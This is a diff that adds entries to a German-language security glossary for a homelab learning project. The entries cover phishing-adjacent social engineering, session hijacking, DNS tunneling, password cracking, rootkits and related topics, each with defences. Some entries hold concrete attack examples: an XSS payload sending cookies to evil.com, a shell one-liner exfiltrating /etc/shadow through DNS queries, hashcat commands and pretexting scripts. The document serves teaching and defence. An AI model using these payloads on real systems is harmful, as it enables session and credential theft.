+      "relatedTerms": ["social-engineering", "credential-stuffing", "owasp-top10"],
+      "links": [
+        { "title": "PhishTank", "url": "https://phishtank.org/" }
+      ]
+    },
+    {
+      "id": "social-engineering",
+      "term": "Social Engineering",
+      "tags": ["Hacking", "Mensch"],
+      "summary": "Menschen manipulieren statt Technik hacken. Der Mensch ist oft die schwächste Stelle — kein Patch für Vertrauen, Hilfsbereitschaft, Angst oder Neugier.",
+      "explanation": "Techniken:\n\n• Pretexting: eine Rolle spielen ('Ich bin der neue IT-Admin, ich brauche Ihr Passwort für die Migration')\n• Baiting: Köder auslegen (USB-Stick auf dem Parkplatz mit 'Gehaltsliste.xlsx')\n• Tailgating: jemandem durch die gesicherte Tür folgen ('Können Sie mir aufhalten? Habe den Badge vergessen')\n• Quid pro quo: Gegenleistung anbieten ('Wenn Sie mir Ihren Login geben, schalte ich Ihnen Premium frei')\n• Authority: Autorität vortäuschen ('CEO sagt Sie sollen sofort 50.000€ überweisen')\n• Urgency: Zeitdruck erzeugen ('Wenn Sie nicht JETZT handeln, wird Ihr Account gelöscht')\n\nKevin Mitnick (berühmtester Social Engineer): 'I could spend hours trying to hack into a system or I could call someone and get the password in 5 minutes.'",
+      "howItWorks": "Angriffsbeispiel:\n1. Angreifer ruft Helpdesk an: 'Hi, ich bin Max aus der IT. Wir migrieren gerade die Server.'\n2. 'Können Sie kurz Ihr Passwort bestätigen damit ich Ihren Account migrieren kann?'\n3. Helpdesk gibt Passwort → Angreifer hat Zugang\n\nSchutz:\n• Niemals Passwörter am Telefon/per Mail bestätigen\n• Rückruf-Verification: 'Ich rufe Sie über die offizielle Nummer zurück'\n• Vier-Augen-Prinzip für kritische Aktionen",
+      "homelab": "Weniger relevant für ein Homelab (du bist der einzige Admin). Aber: wenn du einen Pentest-Lab aufbaust, ist Social Engineering ein wichtiges Thema. SET (Social Engineering Toolkit) auf Kali für Phishing-Simulationen.",
+      "security": "Security Awareness Training ist die einzige Verteidigung gegen Social Engineering. Technische Controls helfen begrenzt (MFA schützt gegen gestohlene Passwörter, aber nicht gegen Malware-Installation).",
+      "relatedTerms": ["phishing", "kill-chain"],
+      "links": [
+        { "title": "Social Engineering Toolkit (SET)", "url": "https://github.com/trustedsec/social-engineer-toolkit" }
+      ]
+    },
+    {
+      "id": "credential-stuffing",
+      "term": "Credential Stuffing",
+      "tags": ["Hacking", "Angriffe", "Identity"],
+      "summary": "Gestohlene Login-Daten von einem Breach bei anderen Diensten ausprobieren. Funktioniert weil Menschen Passwörter recyclen.",
+      "explanation": "Ablauf:\n1. Datenleck bei Dienst A: 10 Millionen E-Mail/Passwort-Kombos geleakt\n2. Angreifer lädt die Liste (z.B. von RaidForums, BreachForums)\n3. Automatisiertes Tool (Hydra, Sentry MBA) probiert alle Kombos bei Dienst B, C, D...\n4. Treffer: max.mustermann@gmail.com / Password123 funktioniert auch bei GitHub, Netflix, PayPal\n\nUnterschiede:\n• Brute Force: ALLE Kombinationen durchprobieren (aaa, aab, aac...)\n• Dictionary: Wortliste mit häufigen Passwörtern\n• Credential Stuffing: ECHTE gestohlene Login-Daten → viel höhere Erfolgsrate\n\nHave I Been Pwned (HIBP): prüfe ob deine E-Mail in bekannten Breaches auftaucht.",
+      "howItWorks": "Schutz für dein Homelab:\n1. KeePassXC für ALLE Passwörter → generierte, einzigartige Passwörter pro Dienst\n2. Kein Passwort-Recycling (AdGuard ≠ Proxmox ≠ GitHub ≠ E-Mail)\n3. MFA wo möglich (Proxmox TOTP, GitHub 2FA)\n4. haveibeenpwned.com → eigene E-Mail prüfen\n5. Fail2Ban / Rate Limiting auf allen Login-Seiten",
+      "homelab": "AdGuard Passwort-Desaster (Session 6): du hast erlebt was passiert wenn man Passwörter verliert. KeePassXC löst das Problem — aber nur wenn du UNTERSCHIEDLICHE Passwörter pro Dienst verwendest.",
+      "security": "Credential Stuffing ist ein Volumen-Angriff — Millionen Versuche pro Stunde. WAFs und CAPTCHAs helfen. MFA ist der beste Schutz: selbst mit korrektem Passwort kein Login ohne zweiten Faktor.",
+      "relatedTerms": ["brute-force-dictionary", "phishing", "mfa-2fa"],
+      "links": [
+        { "title": "Have I Been Pwned", "url": "https://haveibeenpwned.com/" }
+      ]
+    },
+    {
+      "id": "session-hijacking",
+      "term": "Session Hijacking",
+      "tags": ["Hacking", "Web", "Angriffe"],
+      "summary": "Angreifer übernimmt die Session eines eingeloggten Users durch Stehlen des Session-Tokens (Cookie). Wird zum User ohne dessen Passwort zu kennen.",
+      "explanation": "Methoden:\n\n• Cookie Stealing (XSS): JavaScript liest document.cookie → sendet an Angreifer\n• Session Sidejacking: unverschlüsselter Traffic im gleichen WiFi → Cookie mitgesnifft (Firesheep war berühmt dafür)\n• Session Fixation: Angreifer setzt Session-ID VOR dem Login, Opfer loggt sich ein → Angreifer kennt die Session-ID\n• Predictable Session IDs: wenn Session-Tokens nicht zufällig genug sind → geraten/berechnet\n\nFix:\n• HttpOnly Cookie: JavaScript kann den Cookie nicht lesen → XSS-basiertes Stealing unmöglich\n• Secure Flag: Cookie nur über HTTPS gesendet → kein Sidejacking\n• SameSite Flag: Cookie nur an die eigene Site gesendet → kein CSRF\n• Session-Regeneration nach Login: alte Session-ID ungültig → Fixation unmöglich\n• Short Session Timeout: Sessions laufen schnell ab",
+      "howItWorks": "XSS-basiertes Session Hijacking:\n1. Angreifer findet Stored XSS in einem Forum\n2. Injiziert: <script>new Image().src='https://evil.com/steal?c='+document.cookie</script>\n3. Admin besucht das Forum → Script sendet Admin-Cookie an Angreifer\n4. Angreifer setzt Cookie in eigenem Browser: document.cookie='PHPSESSID=gestohlener_wert'\n5. Angreifer ist als Admin eingeloggt → voller Zugriff",
+      "homelab": "Proxmox nutzt PVEAuthCookie mit HttpOnly + Secure. Für andere Self-hosted Apps: Cookie-Flags prüfen (F12 → Application → Cookies). Alle Apps hinter HTTPS (Reverse Proxy) laufen lassen.",
+      "security": "HTTPS ist die Basis-Verteidigung (kein Sidejacking). HttpOnly ist die zweitwichtigste Maßnahme (kein XSS-Stealing). Session-Timeout: Proxmox Default 2h — für kritische Apps kürzer setzen.",
+      "relatedTerms": ["xss", "csrf", "mitm"],
+      "links": []
+    },
+    {
+      "id": "dos-ddos",
+      "term": "DoS / DDoS (Denial of Service)",
+      "tags": ["Hacking", "Angriffe", "Netzwerk"],
+      "summary": "System mit so viel Traffic/Anfragen überfluten dass es für legitime User nicht mehr erreichbar ist. DoS = ein Angreifer, DDoS = viele (Botnet).",
+      "explanation": "Typen:\n\n• Volumetric: massive Bandbreite (UDP Flood, ICMP Flood, DNS Amplification). Ziel: Leitung verstopfen.\n\n• Protocol: TCP-Stack des Servers auslasten (SYN Flood, Ping of Death, Smurf). Ziel: Verbindungs-Tabellen füllen.\n\n• Application Layer: legitim aussehende Requests die den Server überlasten (HTTP Flood, Slowloris). Schwer zu filtern weil sie wie normaler Traffic aussehen.\n\nAmplification Attacks:\n• DNS Amplification: Angreifer sendet kleine DNS-Query (60 Bytes) mit gefälschter Source-IP (Opfer), DNS-Server antwortet mit großer Antwort (4000 Bytes) an das Opfer. Verstärkungsfaktor: 50-70x.\n• NTP Amplification: ähnlich, über monlist-Befehl. Verstärkung: 500x.\n\nBotnet-DDoS: tausende kompromittierte Geräte (IoT-Kameras, Router) senden gleichzeitig Traffic. Mirai-Botnet nutzte IoT-Geräte mit Default-Passwörtern.",
+      "howItWorks": "SYN Flood gegen dein Homelab:\n1. Angreifer sendet 100.000 SYN-Pakete/Sekunde an Proxmox:8006\n2. Proxmox erstellt für jedes SYN einen State-Table Eintrag\n3. State-Table voll → keine neuen Verbindungen möglich\n4. Du kannst dich nicht mehr einloggen\n\nSchutz:\n• SYN Cookies: Server speichert keinen State bis ACK kommt\n• Rate Limiting auf OPNsense: max. 100 neue Verbindungen/Sekunde\n• Nicht direkt am Internet (VPN!) → Angreifer findet den Port gar nicht",
+      "homelab": "Dein Homelab ist aktuell nicht aus dem Internet erreichbar → DDoS kein reales Risiko. Wenn WireGuard kommt: nur UDP 51820 offen, WireGuard antwortet nicht auf unauthentifizierte Pakete (Stealth). DNS Amplification: dein AdGuard NICHT aus dem Internet erreichbar machen (Port 53 auf Firewall blocken).",
+      "security": "DDoS-Schutz für Homelabs: nicht nötig solange nichts exponiert ist. Für öffentliche Dienste: Cloudflare als Reverse Proxy (absorbiert DDoS), Rate Limiting, Geo-Blocking.",
+      "relatedTerms": ["port-scanning", "firewall-typen"],
+      "links": []
+    },
+    {
+      "id": "ransomware",
+      "term": "Ransomware",
+      "tags": ["Hacking", "Malware"],
+      "summary": "Malware die Dateien verschlüsselt und Lösegeld fordert. Häufigster und teuerster Angriffstyp für Unternehmen.",
+      "explanation": "Ablauf:\n1. Initialer Zugang: Phishing-Mail mit Malware-Anhang, RDP Brute Force, VPN-Exploit\n2. Reconnaissance: Angreifer erkundet das Netz (welche Server, welche Daten?)\n3. Privilege Escalation: Domain Admin werden\n4. Lateral Movement: auf alle Server ausbreiten\n5. Exfiltration: sensible Daten kopieren (Double Extortion: Lösegeld ODER Daten werden veröffentlicht)\n6. Encryption: alle Dateien verschlüsseln, Ransom Note hinterlassen\n7. Ransom: 'Zahle X Bitcoin an Wallet Y für den Entschlüsselungskey'\n\nBekannte Gruppen: LockBit, BlackCat/ALPHV, Cl0p, Conti, REvil\n\nVerteidigung:\n• Backups (3-2-1 Regel!) — NICHT am Netz (sonst werden Backups auch verschlüsselt)\n• Patching (viele Ransomware-Gruppen nutzen bekannte CVEs)\n• Segmentierung (Lateral Movement verhindern)\n• MFA (Credential-basierter Initial Access verhindern)\n• Immutable Backups (können nicht verschlüsselt/gelöscht werden)",
+      "howItWorks": "Warum Backups gegen Ransomware helfen:\n1. Ransomware verschlüsselt alle VMs auf Proxmox\n2. DU: Proxmox VM von Hyper-V Checkpoint wiederherstellen\n3. Oder: PBS Backup vom letzten sauberen Stand zurückspielen\n4. Datenverlust: maximal 24h (wenn tägliche Backups)\n5. Kein Lösegeld nötig ✓\n\nABER: wenn Backups auch am Netz hängen → Ransomware verschlüsselt sie mit. Deshalb: Offline-Backup (USB-Disk im Schrank), Air-Gapped Backup, Immutable Storage.",
+      "homelab": "Backup-Strategie (idea-010, deferred): PBS braucht separates Speichermedium. Hyper-V Checkpoints sind ein erster Schutz, aber auf der gleichen SSD — besser als nichts. Langfristig: externe USB-Disk für Offline-Backups.",
+      "security": "Ransomware ist der Hauptgrund warum die 3-2-1 Backup-Regel existiert. Immutable Backups (WORM: Write Once Read Many) sind der Gold-Standard. Cyber-Versicherungen verlangen zunehmend nachweisbare Backup-Strategien.",
+      "relatedTerms": ["backup-321", "lateral-movement", "phishing"],
+      "links": [
+        { "title": "No More Ransom Project", "url": "https://www.nomoreransom.org/" }
+      ]
+    },
+    {
+      "id": "waf",
+      "term": "WAF (Web Application Firewall)",
+      "tags": ["Hacking", "Defense", "Web"],
+      "summary": "Spezialisierte Firewall die HTTP/HTTPS Traffic inspiziert und Web-Angriffe blockt (SQLi, XSS, CSRF, Path Traversal). Sitzt vor Webservern.",
+      "explanation": "Eine normale Firewall sieht nur: TCP, Port 443, Source/Dest IP → erlauben/blocken.\nEine WAF sieht: HTTP POST /login, Body: {user: \"admin' OR '1'='1\"} → SQL Injection → BLOCKEN.\n\nModelle:\n• Negative Model (Blacklist): bekannte Angriffsmuster blocken (OWASP CRS Regeln). Einfach, aber umgehbar mit neuen Angriffen.\n• Positive Model (Whitelist): nur erlaubte Requests durchlassen. Sicherer, aber aufwendig zu konfigurieren.\n• Machine Learning: lernt 'normalen' Traffic und blockt Anomalien. Neue Angriffe erkennen, aber False Positives.\n\nProdukte:\n• ModSecurity: Open Source, Modul für Nginx/Apache. OWASP Core Rule Set (CRS).\n• Cloudflare WAF: Cloud-basiert, vor deinem Server.\n• AWS WAF: für Cloud-Deployments.\n• Coraza: moderner ModSecurity-Nachfolger (Go, WASM).",
+      "howItWorks": "WAF am Reverse Proxy:\n1. Client sendet Request an Reverse Proxy\n2. WAF (ModSecurity) prüft den Request gegen Regeln\n3. Match: OWASP CRS Rule 942100 'SQL Injection Attack Detected'\n4. Action: Request blocken → 403 Forbidden\n5. Log: Angriff dokumentiert für SIEM/Monitoring\n\nOhne WAF: Request geht direkt an die Anwendung → SQL Injection erfolgreich.",
+      "homelab": "Geplant: ModSecurity oder Coraza am Reverse Proxy (Nginx Proxy Manager / Traefik). OWASP CRS als Basisregelset. Erst im Detection-Modus betreiben (nur loggen), dann auf Blocking umschalten.",
+      "security": "WAF ist Defense in Depth — sie ist NICHT der einzige Schutz. Anwendungen müssen trotzdem sicher programmiert sein (Prepared Statements, Output Encoding). WAF ist die letzte Verteidigungslinie, nicht die erste.",
+      "relatedTerms": ["sql-injection", "xss", "owasp-top10", "firewall-typen"],
+      "links": [
+        { "title": "OWASP ModSecurity CRS", "url": "https://coreruleset.org/" },
+        { "title": "Coraza WAF", "url": "https://coraza.io/" }
+      ]
+    },
+    {
+      "id": "password-cracking",
+      "term": "Password Cracking (Hashcat, John the Ripper)",
+      "tags": ["Hacking", "Tools", "Credentials"],
+      "summary": "Passwort-Hashes knacken durch Brute Force, Dictionary oder Rule-based Attacks. Hashcat nutzt GPUs für Milliarden Hashes/Sekunde.",
+      "explanation": "Wenn ein Angreifer eine Datenbank mit Passwort-Hashes stiehlt, muss er die Hashes 'umkehren' — welches Passwort ergibt diesen Hash?\n\n• Brute Force: alle Kombinationen (aaa, aab, aac...). Bei 8 Zeichen (a-z,A-Z,0-9): 218 Billionen Möglichkeiten.\n• Dictionary: Wortliste (rockyou.txt: 14 Mio Passwörter). Schnell, findet schwache Passwörter.\n• Rule-based: Dictionary + Transformationen. 'password' → 'Password1', 'P@ssw0rd', 'password2024'. Hashcat hat hunderte Regeln.\n• Hybrid: Dictionary + Brute Force. 'sommer' + 4 Ziffern → 'sommer0000' bis 'sommer9999'.\n\nGeschwindigkeiten (RTX 3060):\n• MD5: ~25 Milliarden Hashes/Sekunde → jedes 8-Zeichen-Passwort in Minuten\n• SHA-256: ~5 Milliarden/s\n• bcrypt (cost 12): ~25.000/s → 8 Zeichen dauert Jahre\n• Argon2: ~1.000/s → praktisch unknackbar\n\nDeshalb: bcrypt/Argon2 für Passwörter, NICHT MD5/SHA!",
+      "howItWorks": "Lab-Übung mit Hashcat:\n1. Hash extrahieren: $2a$12$a8f2e9c1... (bcrypt aus AdGuard)\n2. hashcat -m 3200 hash.txt rockyou.txt → Dictionary gegen bcrypt\n3. Ergebnis: bei bcrypt cost 12 dauert rockyou.txt ~10 Stunden\n4. Bei MD5 hätte es 2 Sekunden gedauert\n\nJohn the Ripper:\njohn --wordlist=rockyou.txt --format=bcrypt hash.txt",
+      "homelab": "Deine RTX 3060 hat 12GB VRAM — perfekt für GPU-basiertes Cracking mit Hashcat. Im Lab-VLAN üben: Hashes von Metasploitable/DVWA extrahieren und knacken. Vergleiche: wie lange dauert MD5 vs bcrypt vs Argon2?",
+      "security": "Erkenntnis: die Hash-Funktion entscheidet ob ein Passwort in Sekunden oder Jahren geknackt wird. MD5/SHA für Passwörter = fahrlässig. bcrypt mit cost ≥ 12, Argon2 wenn möglich. Lange Passwörter (20+ Zeichen, Passphrase) sind besser als kurze komplexe.",
+      "relatedTerms": ["hashing", "salt-pepper", "brute-force-dictionary"],
+      "links": [
+        { "title": "Hashcat", "url": "https://hashcat.net/hashcat/" },
+        { "title": "John the Ripper", "url": "https://www.openwall.com/john/" }
+      ]
+    },
+    {
+      "id": "buffer-overflow",
+      "term": "Buffer Overflow",
+      "tags": ["Hacking", "Exploitation", "Low-Level"],
+      "summary": "Programm schreibt mehr Daten in einen Puffer als er fasst — die überschüssigen Daten überschreiben benachbarten Speicher. Kann zur Code-Ausführung führen.",
+      "explanation": "Ein Buffer ist ein reservierter Speicherbereich fester Größe. Wenn ein Programm nicht prüft ob die Eingabe in den Buffer passt:\n\nchar buffer[64];\nstrcpy(buffer, user_input);  // user_input ist 200 Bytes → Overflow!\n\nWas passiert:\n• Die 64 Bytes des Buffers werden gefüllt\n• Die nächsten 136 Bytes überschreiben andere Variablen, Funktionszeiger, Return Address\n• Angreifer kontrolliert die Return Address → kann beliebigen Code ausführen\n\nModerne Schutzmaßnahmen:\n• ASLR (Address Space Layout Randomization): Speicheradressen werden randomisiert → Angreifer weiß nicht wohin er springen soll\n• DEP/NX (Data Execution Prevention): Stack ist nicht ausführbar → injizierter Code kann nicht direkt ausgeführt werden\n• Stack Canaries: Zufallswerte vor der Return Address → Überschreibung wird erkannt\n• Sichere Funktionen: strncpy statt strcpy, snprintf statt sprintf",
+      "howItWorks": "Vereinfacht:\nStack (wächst nach unten):\n┌──────────────────┐ hohe Adresse\n│ Return Address   │ ← hierhin will der Angreifer\n│ Saved EBP       │\n│ buffer[64]       │ ← hierhin schreibt der User\n│ ...              │\n└──────────────────┘ niedrige Adresse\n\nAngreifer sendet 80 Bytes:\n• Bytes 1-64: füllen den Buffer\n• Bytes 65-68: überschreiben Saved EBP\n• Bytes 69-72: überschreiben Return Address → zeigt auf Angreifer-Code\n• Bytes 73-80: Shellcode (z.B. /bin/sh starten)\n\nFunktion kehrt zurück → springt zum Shellcode → Angreifer hat Shell",
+      "homelab": "Buffer Overflows in modernen Sprachen (Python, Go, Rust) praktisch unmöglich (Bounds Checking). Relevant für C/C++-Programme (Kernel, OpenSSH, Nginx). Im Lab: exploit-education.com VMs zum Üben. Proxmox/Debian: Kernel hat ASLR + NX aktiv.",
+      "security": "Patches sind der wichtigste Schutz — die meisten Buffer Overflow CVEs werden schnell gefixt. ASLR + DEP + Stack Canaries machen Exploitation viel schwieriger (aber nicht unmöglich). Rust verhindert Buffer Overflows by Design (Memory Safety).",
+      "relatedTerms": ["privilege-escalation", "cve-vulnerability", "reverse-shell"],
+      "links": [
+        { "title": "Exploit Education", "url": "https://exploit.education/" }
+      ]
+    },
+    {
+      "id": "dns-tunneling",
+      "term": "DNS Tunneling (Datenexfiltration über DNS)",
+      "tags": ["Hacking", "Exfiltration", "DNS"],
+      "summary": "Daten in DNS-Queries verstecken um Firewalls zu umgehen. DNS-Traffic wird selten geblockt oder inspiziert — perfekter Covert Channel.",
+      "explanation": "DNS-Traffic wird fast nie geblockt (jedes Gerät braucht DNS). Angreifer nutzen das aus:\n\n1. Daten werden Base64-kodiert und als Subdomain-Name gesendet:\n   Query: dGhpcyBpcyBzZWNyZXQ.evil.com → 'this is secret'\n2. Der DNS-Server von evil.com (Angreifer kontrolliert) dekodiert die Subdomain → hat die Daten\n3. Antwort-Daten werden als TXT-Record zurückgeschickt\n\nTools:\n• iodine: IP-over-DNS Tunnel (VPN über DNS)\n• dnscat2: Command & Control über DNS\n• DNSExfiltrator: Daten über DNS exfiltrieren\n\nDetektion:\n• Ungewöhnlich lange Subdomain-Names (>30 Zeichen)\n• Hohe DNS-Query-Rate von einem Host\n• Ungewöhnliche Record-Typen (TXT, NULL) in hoher Frequenz\n• Queries zu unbekannten Domains",
+      "howItWorks": "Szenario: Angreifer im Lab-VLAN will Daten rausschmuggeln:\n1. Firewall blockt allen Traffic aus Lab → kein HTTP, kein SSH raus\n2. Aber: DNS (Port 53) ist erlaubt (VMs brauchen Namensauflösung)\n3. Angreifer: cat /etc/shadow | base64 | while read line; do dig $line.evil.com; done\n4. AdGuard leitet die Queries an Cloudflare → Cloudflare fragt evil.com DNS\n5. Evil.com DNS Server sammelt die Base64-Chunks → hat /etc/shadow\n\nSchutz:\n• DNS-Traffic durch AdGuard analysieren (ungewöhnliche Query-Patterns)\n• Nur erlaubte DNS-Server (AdGuard) → keine direkten DNS-Queries ans Internet\n• DNS-Query-Length Limits in OPNsense/Suricata",
+      "homelab": "AdGuard ist dein DNS-Chokepoint — allen DNS-Traffic durch AdGuard zwingen (Firewall: Port 53 nur zu 192.168.0.201 erlauben). Suricata kann DNS-Tunneling Patterns erkennen (ET Rules). Im Lab: DNS Tunneling selbst ausprobieren (iodine).",
+      "security": "DNS Tunneling ist ein reales Risiko in Enterprise-Netzen. Viele Firewalls inspizieren DNS nicht. DNS-over-HTTPS (DoH) macht es noch schwerer zu erkennen weil der DNS-Traffic verschlüsselt ist.",
+      "relatedTerms": ["reconnaissance", "lateral-movement"],
+      "links": [
+        { "title": "iodine DNS Tunnel", "url": "https://code.kryo.se/iodine/" },
+        { "title": "dnscat2", "url": "https://github.com/iagox86/dnscat2" }
+      ]
+    },
+    {
+      "id": "wireshark-tcpdump",
+      "term": "Wireshark & tcpdump (Paket-Analyse)",
+      "tags": ["Hacking", "Tools", "Analyse"],
+      "summary": "Netzwerk-Traffic mitschneiden und analysieren. Wireshark hat eine GUI, tcpdump ist CLI-basiert. Essentiell für Debugging UND für Angreifer.",
+      "explanation": "• tcpdump (CLI):\n  sudo tcpdump -i eth0 port 53 -nn → DNS-Traffic auf eth0 mitschneiden\n  sudo tcpdump -i eth0 host 192.168.0.200 -w capture.pcap → in Datei speichern\n  -nn: keine DNS-Auflösung (schneller), -v: verbose, -X: Hex+ASCII Dump\n\n• Wireshark (GUI):\n  Grafische Analyse, Filter, Follow TCP Stream, Protocol Dissectors\n  Kann pcap-Dateien von tcpdump öffnen\n  Display Filter: tcp.port == 8006, dns.qry.name contains 'homelab'\n  Follow → TCP Stream: gesamte HTTP-Konversation lesen\n\nWas man sieht:\n• Unverschlüsselter HTTP: ALLES (URLs, POST-Daten, Cookies, Passwörter)\n• HTTPS/TLS: nur Handshake + verschlüsselte Daten (Inhalt nicht lesbar)\n• DNS: alle angefragten Domains (selbst wenn die Verbindung danach verschlüsselt ist)\n• ARP: wer fragt nach welcher MAC\n• DHCP: wer bekommt welche IP",
+      "howItWorks": "Debugging auf dem Jumphost:\nsudo tcpdump -i eth0 port 53 -nn\n→ Sieht: welche DNS-Queries gehen von dieser VM raus?\n\nsudo tcpdump -i eth0 host 192.168.0.200 -nn\n→ Sieht: welcher Traffic geht zum Proxmox?\n\nCapture speichern und auf Windows mit Wireshark analysieren:\nsudo tcpdump -i eth0 -w /tmp/capture.pcap -c 1000\nscp noob@jumphost:/tmp/capture.pcap .\n→ Wireshark auf Windows öffnen → detaillierte Analyse",
+      "homelab": "tcpdump auf Jumphost und Proxmox installiert. Wireshark auf Windows für GUI-Analyse. Essentielle Troubleshooting-Skills: 'Netz geht nicht' → tcpdump zeigt ob Pakete ankommen, wo sie verloren gehen, ob DNS funktioniert.",
+      "security": "Paket-Captures enthalten ALLES — Passwörter in HTTP, Cookies, API-Keys. Captures sicher aufbewahren oder nach dem Debugging löschen. Im Lab: Wireshark nutzen um eigene Angriffe zu analysieren (ARP Spoofing, Port Scanning → was sieht das Netz?).",
+      "relatedTerms": ["netzwerk-debugging", "reconnaissance", "mitm"],
+      "links": [
+        { "title": "Wireshark", "url": "https://www.wireshark.org/" },
+        { "title": "tcpdump Examples", "url": "https://danielmiessler.com/study/tcpdump/" }
+      ]
+    },
+    {
+      "id": "rootkit",
+      "term": "Rootkit",
+      "tags": ["Hacking", "Malware", "Persistence"],
+      "summary": "Malware die sich tief im System versteckt (Kernel, Bootloader, Firmware) und ihre Präsenz aktiv verschleiert. Extrem schwer zu erkennen und zu entfernen.",
+      "explanation": "Typen (nach Tiefe):\n\n• User-Mode Rootkit: ersetzt normale Programme (ls, ps, netstat) durch manipulierte Versionen die den Angreifer verstecken. 'ps' zeigt den Malware-Prozess nicht an.\n\n• Kernel-Mode Rootkit: lädt als Kernel-Modul, manipuliert System Calls direkt. Das OS selbst belügt jeden der fragt. Kein Userspace-Tool kann es erkennen.\n\n• Bootkits: infiziert den Bootloader oder MBR/UEFI. Startet VOR dem Betriebssystem → kontrolliert alles von Anfang an.\n\n• Firmware Rootkits: in BIOS/UEFI, NIC-Firmware, SSD-Controller. Überlebt OS-Neuinstallation und Festplattenwechsel.\n\nDetektion:\n• chkrootkit, rkhunter: scannen nach bekannten Rootkit-Signaturen\n• Vergleich von außen: Live-CD booten und Dateisystem von außen prüfen\n• Integrity Monitoring: AIDE/Tripwire vergleichen Dateien gegen bekannten guten Zustand",
+      "howItWorks": "User-Mode Rootkit Beispiel:\n1. Angreifer hat Root-Zugang erlangt\n2. Ersetzt /bin/ls durch manipulierte Version\n3. Erstellt /root/.hidden/backdoor (Reverse Shell)\n4. ls /root/.hidden/ → zeigt NICHTS (ls ist manipuliert)\n5. ps aux → zeigt backdoor-Prozess NICHT an (ps ist manipuliert)\n6. Admin sieht nichts Verdächtiges → Rootkit bleibt unentdeckt\n\nErkennung:\n• md5sum /bin/ls und vergleichen mit bekanntem Hash\n• Live-CD booten → von außen aufs Dateisystem schauen\n• rkhunter --check → scannt nach bekannten Rootkit-Patterns",
+      "homelab": "rkhunter auf Jumphost und Proxmox installieren (apt install rkhunter). Regelmäßig scannen. Integrity-Monitoring (AIDE) als Cronjob: vergleicht Dateien gegen eine Baseline.",
+      "security": "Wenn ein Kernel-Rootkit gefunden wird: System NICHT reparieren — komplett neu aufsetzen (Nuke from Orbit). Deshalb sind Backups so wichtig: sauberes Image zurückspielen statt ein kompromittiertes System zu 'säubern'.",
+      "relatedTerms": ["privilege-escalation", "ransomware", "backup-321"],
+      "links": [
+        { "title": "rkhunter", "url": "http://rkhunter.sourceforge.net/" },
+        { "title": "chkrootkit", "url": "http://www.chkrootkit.org/" }
+      ]
+    },
+    {
+      "id": "zero-day",
+      "term": "Zero-Day (0-Day Exploit)",
+      "tags": ["Hacking", "Exploitation"],
+      "summary": "Eine Schwachstelle die dem Hersteller NICHT bekannt ist — es gibt keinen Patch. 'Zero Days' seit der Hersteller davon weiß. Extrem wertvoll und gefährlich.",
+      "explanation": "Timeline einer Schwachstelle:\n1. Schwachstelle existiert im Code (niemand weiß davon)\n2. Angreifer findet sie → Zero-Day (0 Tage seit Bekanntwerden)\n3. Angreifer nutzt sie aus (Zero-Day Exploit)\n4. Hersteller erfährt davon (durch Angriff, Bug Bounty, oder Zufall)\n5. Hersteller entwickelt Patch (1-Day, N-Day)\n6. Patch wird veröffentlicht\n7. User installieren den Patch\n\nZwischen Schritt 2 und 6: das Zeitfenster in dem jeder verwundbar ist und nichts dagegen tun kann.\n\nZero-Day Markt:\n• Bug Bounty (legaler Markt): Hersteller zahlt für gemeldete Schwachstellen (Google: bis $250k)\n• Grauer Markt: Broker verkaufen an Regierungen (Zerodium: bis $2.5M für iOS Remote Exploit)\n• Schwarzer Markt: Verkauf an Cyberkriminelle\n\nBerühmte Zero-Days: Stuxnet (4 Zero-Days gleichzeitig), EternalBlue (NSA, dann geleakt → WannaCry), Log4Shell (2021, CVSS 10.0)",
+      "howItWorks": "Schutz gegen Zero-Days (da kein Patch existiert):\n1. Defense in Depth: mehrere Schutzschichten → Zero-Day in einer Schicht wird von anderer aufgefangen\n2. Least Privilege: selbst wenn Exploit gelingt, begrenzte Rechte\n3. Segmentierung: kompromittierter Host kann nicht weiter\n4. Monitoring: ungewöhnliches Verhalten erkennen (IDS Anomaly-based)\n5. Application Whitelisting: nur bekannte Programme dürfen laufen\n6. Rapid Patching: sobald ein Patch verfügbar ist, SOFORT installieren",
+      "homelab": "Gegen Zero-Days hilft kein Patch (es gibt keinen). Deine Verteidigung: VPN (Angriffsfläche minimieren), VLANs (Isolation), Monitoring (Erkennung), Backups (Recovery). Wenn ein Zero-Day für Proxmox VE auftaucht: sofort Proxmox Security Advisories checken.",
+      "security": "Zero-Days sind selten und teuer — die meisten Angriffe nutzen BEKANNTE, UNGEPATCHTE Schwachstellen. Regelmäßiges Patching schützt gegen 95% aller Angriffe. Zero-Day-Schutz ist Defense in Depth.",
+      "relatedTerms": ["cve-vulnerability", "kill-chain", "defense-in-depth"],
+      "links": [
+        { "title": "Google Project Zero", "url": "https://googleprojectzero.blogspot.com/" },
+        { "title": "Zero Day Initiative", "url": "https://www.zerodayinitiative.com/" }
+      ]
+    }
+  ]
+}
